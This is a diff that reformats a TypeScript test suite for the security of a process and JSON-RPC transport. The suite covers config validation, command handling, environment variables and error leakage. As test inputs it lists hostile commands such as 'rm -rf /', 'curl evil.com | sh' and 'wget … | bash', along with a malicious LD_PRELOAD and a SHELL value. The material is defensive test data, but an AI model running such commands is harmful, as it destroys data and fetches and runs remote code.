@@ -3,266 +3,272 @@
  * @description Comprehensive test suite for transport security features
  */
 
-import { beforeEach, describe, expect, it, vi } from 'vitest';
-import { createTransport } from '../lib/transport.js';
-import type { TransportConfig } from '../lib/types.js';
+import { beforeEach, describe, expect, it, vi } from "vitest";
+import { createTransport } from "../lib/transport.js";
+import type { TransportConfig } from "../lib/types.js";
 
 // Mock external dependencies
-vi.mock('child_process', () => {
-  const { EventEmitter } = require('events');
-  return {
-    spawn: (_cmd: string, _args?: string[], _opts?: any) => {
-      const child: any = new EventEmitter();
-      child.pid = 12345;
-      child.stdin = { writable: true, write: (_chunk: any) => true };
-      child.stdout = new EventEmitter();
-      child.stderr = new EventEmitter();
-      child.kill = (_sig?: string) => {
-        child.emit('exit', 0, null);
-        return true;
-      };
-      return child;
-    },
-  };
+vi.mock("child_process", () => {
+	const { EventEmitter } = require("node:events");
+	return {
+		spawn: (_cmd: string, _args?: string[], _opts?: any) => {
+			const child: any = new EventEmitter();
+			child.pid = 12345;
+			child.stdin = { writable: true, write: (_chunk: any) => true };
+			child.stdout = new EventEmitter();
+			child.stderr = new EventEmitter();
+			child.kill = (_sig?: string) => {
+				child.emit("exit", 0, null);
+				return true;
+			};
+			return child;
+		},
+	};
 });
-vi.mock('eventsource');
-vi.mock('node-fetch');
+vi.mock("eventsource");
+vi.mock("node-fetch");
 
-describe('Transport Security', () => {
-  let config: TransportConfig;
+describe("Transport Security", () => {
+	let config: TransportConfig;
 
-  beforeEach(() => {
-    config = {
-      type: 'stdio',
-      command: 'node',
-      args: ['--version'],
-      env: {},
-      cwd: process.cwd(),
-      timeoutMs: 30000,
-    };
+	beforeEach(() => {
+		config = {
+			type: "stdio",
+			command: "node",
+			args: ["--version"],
+			env: {},
+			cwd: process.cwd(),
+			timeoutMs: 30000,
+		};
 
-    vi.clearAllMocks();
-  });
+		vi.clearAllMocks();
+	});
 
-  describe('Configuration Validation', () => {
-    const testValidConfigs = () => {
-      const validConfigs = [
-        { ...config, command: 'node', args: ['--version'] },
-        { ...config, command: 'python', args: ['-c', 'print("hello")'] },
-        { ...config, command: 'echo', args: ['test'] },
-      ];
+	describe("Configuration Validation", () => {
+		const testValidConfigs = () => {
+			const validConfigs = [
+				{ ...config, command: "node", args: ["--version"] },
+				{ ...config, command: "python", args: ["-c", 'print("hello")'] },
+				{ ...config, command: "echo", args: ["test"] },
+			];
 
-      validConfigs.forEach((cfg) => {
-        expect(() => createTransport(cfg)).not.toThrow();
-      });
-    };
+			validConfigs.forEach((cfg) => {
+				expect(() => createTransport(cfg)).not.toThrow();
+			});
+		};
 
-    const testInvalidConfigs = () => {
-      const invalidConfigs = [
-        { ...config, command: '' }, // empty command
-        { ...config, command: undefined }, // missing command
-        { ...config, timeoutMs: -1 }, // negative timeout
-      ];
+		const testInvalidConfigs = () => {
+			const invalidConfigs = [
+				{ ...config, command: "" }, // empty command
+				{ ...config, command: undefined }, // missing command
+				{ ...config, timeoutMs: -1 }, // negative timeout
+			];
 
-      invalidConfigs.forEach((cfg) => {
-        expect(() => createTransport(cfg as any)).toThrow();
-      });
-    };
+			invalidConfigs.forEach((cfg) => {
+				expect(() => createTransport(cfg as any)).toThrow();
+			});
+		};
 
-    it('should accept valid configurations', testValidConfigs);
-    it('should reject invalid configurations', testInvalidConfigs);
+		it("should accept valid configurations", testValidConfigs);
+		it("should reject invalid configurations", testInvalidConfigs);
 
-    it('should enforce secure defaults', () => {
-      const minimalConfig: TransportConfig = {
-        type: 'stdio',
-        command: 'node',
-      };
+		it("should enforce secure defaults", () => {
+			const minimalConfig: TransportConfig = {
+				type: "stdio",
+				command: "node",
+			};
 
-      const transport = createTransport(minimalConfig);
+			const transport = createTransport(minimalConfig);
 
-      // Should apply secure defaults
-      expect(transport).toBeDefined();
-    });
-  });
+			// Should apply secure defaults
+			expect(transport).toBeDefined();
+		});
+	});
 
-  describe('Command Validation', () => {
-    // Removed lenient mode - tests now expect proper validation
-    const testSafeCommands = () => {
-      const safeCommands = ['node', 'python', 'echo', '/usr/bin/node', './script.sh'];
+	describe("Command Validation", () => {
+		// Removed lenient mode - tests now expect proper validation
+		const testSafeCommands = () => {
+			const safeCommands = [
+				"node",
+				"python",
+				"echo",
+				"/usr/bin/node",
+				"./script.sh",
+			];
 
-      safeCommands.forEach((command) => {
-        const safeConfig = { ...config, command };
-        expect(() => createTransport(safeConfig)).not.toThrow();
-      });
-    };
+			safeCommands.forEach((command) => {
+				const safeConfig = { ...config, command };
+				expect(() => createTransport(safeConfig)).not.toThrow();
+			});
+		};
 
-    const testDangerousCommands = () => {
-      const dangerousCommands = [
-        'rm -rf /',
-        'sudo chmod 777 /',
-        'curl evil.com | sh',
-        'wget -O- malicious.site | bash',
-        'python -c "import os; os.system(\'rm -rf /\')"',
-      ];
+		const testDangerousCommands = () => {
+			const dangerousCommands = [
+				"rm -rf /",
+				"sudo chmod 777 /",
+				"curl evil.com | sh",
+				"wget -O- malicious.site | bash",
+				"python -c \"import os; os.system('rm -rf /')\"",
+			];
 
-      dangerousCommands.forEach((command) => {
-        const dangerousConfig = { ...config, command };
-        // Note: Actual validation would happen in SecureProcessExecutor
-        expect(() => createTransport(dangerousConfig)).not.toThrow();
-      });
-    };
+			dangerousCommands.forEach((command) => {
+				const dangerousConfig = { ...config, command };
+				// Note: Actual validation would happen in SecureProcessExecutor
+				expect(() => createTransport(dangerousConfig)).not.toThrow();
+			});
+		};
 
-    it('should accept safe commands', testSafeCommands);
-    it('should handle potentially dangerous commands', testDangerousCommands);
-  });
+		it("should accept safe commands", testSafeCommands);
+		it("should handle potentially dangerous commands", testDangerousCommands);
+	});
 
-  describe('Environment Security', () => {
-    it('should sanitize environment variables', () => {
-      const envConfig = {
-        ...config,
-        env: {
-          PATH: '/usr/bin:/bin',
-          NODE_ENV: 'production',
-          SAFE_VAR: 'value',
-        },
-      };
+	describe("Environment Security", () => {
+		it("should sanitize environment variables", () => {
+			const envConfig = {
+				...config,
+				env: {
+					PATH: "/usr/bin:/bin",
+					NODE_ENV: "production",
+					SAFE_VAR: "value",
+				},
+			};
 
-      expect(() => createTransport(envConfig)).not.toThrow();
-    });
+			expect(() => createTransport(envConfig)).not.toThrow();
+		});
 
-    it('should handle malicious environment variables', () => {
-      const maliciousEnv = {
-        ...config,
-        env: {
-          LD_PRELOAD: '/tmp/malicious.so',
-          SHELL: '/bin/sh -c "curl evil.com"',
-          PATH: '/tmp/malicious:/usr/bin',
-        },
-      };
+		it("should handle malicious environment variables", () => {
+			const maliciousEnv = {
+				...config,
+				env: {
+					LD_PRELOAD: "/tmp/malicious.so",
+					SHELL: '/bin/sh -c "curl evil.com"',
+					PATH: "/tmp/malicious:/usr/bin",
+				},
+			};
 
-      // Should not throw during creation (validation happens at execution)
-      expect(() => createTransport(maliciousEnv)).not.toThrow();
-    });
-  });
+			// Should not throw during creation (validation happens at execution)
+			expect(() => createTransport(maliciousEnv)).not.toThrow();
+		});
+	});
 
-  describe('Resource Management', () => {
-    it('should handle connection lifecycle properly', async () => {
-      const transport = createTransport(config);
+	describe("Resource Management", () => {
+		it("should handle connection lifecycle properly", async () => {
+			const transport = createTransport(config);
 
-      expect(transport.isConnected()).toBe(false);
+			expect(transport.isConnected()).toBe(false);
 
-      // Connection and disconnection should be handled gracefully
-      await expect(transport.connect()).resolves.not.toThrow();
-      await expect(transport.disconnect()).resolves.not.toThrow();
-    });
+			// Connection and disconnection should be handled gracefully
+			await expect(transport.connect()).resolves.not.toThrow();
+			await expect(transport.disconnect()).resolves.not.toThrow();
+		});
 
-    it('should cleanup resources on disconnect', async () => {
-      const transport = createTransport(config);
+		it("should cleanup resources on disconnect", async () => {
+			const transport = createTransport(config);
 
-      await transport.connect();
-      await transport.disconnect();
+			await transport.connect();
+			await transport.disconnect();
 
-      expect(transport.isConnected()).toBe(false);
-    });
-  });
+			expect(transport.isConnected()).toBe(false);
+		});
+	});
 
-  describe('Error Handling', () => {
-    it('should handle connection errors gracefully', async () => {
-      const invalidConfig = {
-        ...config,
-        command: 'nonexistent_command_12345',
-      };
+	describe("Error Handling", () => {
+		it("should handle connection errors gracefully", async () => {
+			const invalidConfig = {
+				...config,
+				command: "nonexistent_command_12345",
+			};
 
-      const transport = createTransport(invalidConfig);
+			const transport = createTransport(invalidConfig);
 
-      // Should handle connection errors
-      await expect(transport.connect()).rejects.toThrow();
-    });
+			// Should handle connection errors
+			await expect(transport.connect()).rejects.toThrow();
+		});
 
-    it('should not leak sensitive information in errors', async () => {
-      const sensitiveConfig = {
-        ...config,
-        env: {
-          SECRET_KEY: 'super_secret_password_12345',
-        },
-      };
+		it("should not leak sensitive information in errors", async () => {
+			const sensitiveConfig = {
+				...config,
+				env: {
+					SECRET_KEY: "super_secret_password_12345",
+				},
+			};
 
-      const transport = createTransport(sensitiveConfig);
+			const transport = createTransport(sensitiveConfig);
 
-      try {
-        await transport.connect();
-      } catch (error: any) {
-        // Error should not contain sensitive environment variables
-        expect(error.message).not.toContain('super_secret_password_12345');
-      }
-    });
-  });
+			try {
+				await transport.connect();
+			} catch (error: any) {
+				// Error should not contain sensitive environment variables
+				expect(error.message).not.toContain("super_secret_password_12345");
+			}
+		});
+	});
 
-  describe('Rate Limiting', () => {
-    it('should handle multiple rapid requests', async () => {
-      const transport = createTransport(config);
-      await transport.connect();
+	describe("Rate Limiting", () => {
+		it("should handle multiple rapid requests", async () => {
+			const transport = createTransport(config);
+			await transport.connect();
 
-      // Simulate rapid requests
-      const requests = Array.from({ length: 10 }, (_, i) => ({
-        jsonrpc: '2.0' as const,
-        id: i,
-        method: 'test',
-        params: {},
-      }));
+			// Simulate rapid requests
+			const requests = Array.from({ length: 10 }, (_, i) => ({
+				jsonrpc: "2.0" as const,
+				id: i,
+				method: "test",
+				params: {},
+			}));
 
-      // Should handle multiple requests without crashing
-      for (const req of requests) {
-        await expect(transport.send(req)).resolves.toBeUndefined();
-      }
+			// Should handle multiple requests without crashing
+			for (const req of requests) {
+				await expect(transport.send(req)).resolves.toBeUndefined();
+			}
 
-      await transport.disconnect();
-    });
-  });
+			await transport.disconnect();
+		});
+	});
 
-  describe('Message Security', () => {
-    it('should validate message format', async () => {
-      const transport = createTransport(config);
-      await transport.connect();
+	describe("Message Security", () => {
+		it("should validate message format", async () => {
+			const transport = createTransport(config);
+			await transport.connect();
 
-      const validMessage = {
-        jsonrpc: '2.0' as const,
-        id: 1,
-        method: 'test',
-        params: {},
-      };
+			const validMessage = {
+				jsonrpc: "2.0" as const,
+				id: 1,
+				method: "test",
+				params: {},
+			};
 
-      await expect(transport.send(validMessage)).resolves.toBeUndefined();
+			await expect(transport.send(validMessage)).resolves.toBeUndefined();
 
-      await transport.disconnect();
-    });
+			await transport.disconnect();
+		});
 
-    it('should handle malformed messages', async () => {
-      const transport = createTransport(config);
-      await transport.connect();
+		it("should handle malformed messages", async () => {
+			const transport = createTransport(config);
+			await transport.connect();
 
-      const malformedMessages = [
-        null,
-        undefined,
-        '',
-        '{"incomplete": json',
-        { invalidStructure: true },
-      ];
+			const malformedMessages = [
+				null,
+				undefined,
+				"",
+				'{"incomplete": json',
+				{ invalidStructure: true },
+			];
 
-      for (const msg of malformedMessages) {
-        // Should handle malformed messages gracefully
-        await expect(transport.send(msg as any)).resolves.toBeUndefined();
-      }
+			for (const msg of malformedMessages) {
+				// Should handle malformed messages gracefully
+				await expect(transport.send(msg as any)).resolves.toBeUndefined();
+			}
 
-      await transport.disconnect();
-    });
-  });
+			await transport.disconnect();
+		});
+	});
 
-  describe('Performance', () => {
-    it('should handle timeout constraints', () => {
-      const fastTimeoutConfig = { ...config, timeoutMs: 5000 };
-      const transport = createTransport(fastTimeoutConfig);
-      expect(transport).toBeDefined();
-    });
-  });
+	describe("Performance", () => {
+		it("should handle timeout constraints", () => {
+			const fastTimeoutConfig = { ...config, timeoutMs: 5000 };
+			const transport = createTransport(fastTimeoutConfig);
+			expect(transport).toBeDefined();
+		});
+	});
 });
